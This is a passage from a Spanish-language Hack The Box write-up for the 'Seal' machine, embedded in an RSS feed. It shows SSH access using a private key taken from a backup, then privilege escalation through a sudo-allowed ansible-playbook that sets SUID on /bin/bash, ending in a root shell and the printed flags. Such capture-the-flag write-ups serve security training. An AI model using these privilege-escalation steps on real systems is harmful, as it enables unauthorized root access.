tomcat@seal:/dev/shm$ tar -zxvf backup.gz
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; ... REDACTED ... &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
dashboard/uploads/.ssh/
dashboard/uploads/.ssh/id_rsa
dashboard/uploads/.ssh/id_rsa.pub
dashboard/uploads/.ssh/authorized_keys
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; ... REDACTED ... &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
tomcat@seal:/dev/shm$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Con ello conseguimos acceso a este usuario por SSH y la flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; Ï€ ~/htb/seal â¯ ssh luis@seal.htb -i id_rsa_luis
Welcome to Ubuntu 20.04.2 LTS &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;GNU/Linux 5.4.0-77-generic x86_64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; 11:06:53 PM UTC

  System load:           0.14
  Usage of /:            47.1% of 9.58GB
  Memory usage:          60%
  Swap usage:            0%
  Processes:             &lt;span class=&#34;m&#34;&gt;180&lt;/span&gt;
  Users logged in:       &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
  IPv4 address &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; eth0: 10.10.10.250
  IPv6 address &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; eth0: dead:beef::250:56ff:feb9:1ee8


&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; updates can be applied immediately.


The list of available updates is more than a week old.
To check &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Jul &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; 17:22:51 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; from 10.10.14.4
luis@seal:~$ ls
gitbucket.war  user.txt
luis@seal:~$ cat user.txt
9ee0bf21e12a6c27854c72cb79d3729a
luis@seal:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;db---gitbucket&#34;&gt;DB - Gitbucket&lt;/h2&gt;
&lt;p&gt;En la carpeta principal de &lt;code&gt;Luis&lt;/code&gt; encontramos el archivo &lt;code&gt;data.mv.db&lt;/code&gt;, con &lt;a href=&#34;https://dbeaver.io/&#34;&gt;dbeaver&lt;/a&gt; vemos que es la &amp;ldquo;base de datos&amp;rdquo; de esta plataforma, ademÃ¡s encontramos los hashes de los usuarios registrados.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/seal/Screenshot_20210716_182348.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;privesc&#34;&gt;Privesc&lt;/h1&gt;
&lt;p&gt;Tras ejecutar &lt;code&gt;sudo -l -l&lt;/code&gt; vemos que tenemos permisos sudo (root) para ejecutar el comando &lt;code&gt;ansible-playbook&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;luis@seal:~$ sudo -l -l
Matching Defaults entries &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; luis on seal:
    env_reset, mail_badpass, &lt;span class=&#34;nv&#34;&gt;secure_path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/bin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/snap/bin

User luis may run the following commands on seal:

Sudoers entry:
    RunAsUsers: ALL
    Options: !authenticate
    Commands:
  /usr/bin/ansible-playbook *
luis@seal:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Creamos un archivo que le da permisos suid a &lt;code&gt;/bin/bash&lt;/code&gt; en la carpeta de Luis.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;chmod u+s /bin/bash&amp;#34;&lt;/span&gt; &amp;gt; /home/luis/upgrade_bash.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tambien creamos el archivo &lt;code&gt;upgrade.yml&lt;/code&gt; siguiendo la documentacion para ejecutar &lt;a href=&#34;https://docs.ansible.com/ansible/2.4/command_module.html#examples&#34;&gt;comandos&lt;/a&gt; en este caso para ejecutar nuestro archivo &lt;code&gt;upgrade_bash.sh&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;- hosts: localhost
  tasks:
  - name: Upgrade Bash to SUID
    command: /bin/bash /home/luis/upgrade_bash.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tras ejecutar el archivo logramos obtener una shell como root y la flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;luis@seal:~$ sudo /usr/bin/ansible-playbook upgrade.yml
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;WARNING&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match &lt;span class=&#34;s1&#34;&gt;&amp;#39;all&amp;#39;&lt;/span&gt;

PLAY &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;localhost&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ***************************************************************************************************************************************************************************

TASK &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Gathering Facts&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; *********************************************************************************************************************************************************************
ok: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;localhost&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

TASK &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SSH Key&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; *****************************************************************************************************************************************************************************
changed: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;localhost&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

PLAY RECAP *********************************************************************************************************************************************************************************
localhost                  : &lt;span class=&#34;nv&#34;&gt;ok&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;changed&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;unreachable&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;failed&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;skipped&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;rescued&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;ignored&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;

luis@seal:~$ ls -lah /bin/bash
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root 1.2M Jun &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; /bin/bash
luis@seal:~$ /bin/bash -p
bash-5.0# whoami
root
bash-5.0# &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /root
bash-5.0# ls
root.txt  snap
bash-5.0# cat root.txt
05a0803bb8bb99a5cb90f63c08b74445
bash-5.0#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/seal/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/seal/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>ansible-playbook</category>
            
          
            
              <category>playbook</category>
            
          
            
              <category>symlink</category>
            
          
            
              <category>tomcat</category>
            
          
            
              <category>nginx</category>
            
          
            
              <category>gitbucket</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
      

    
  </channel>
</rss>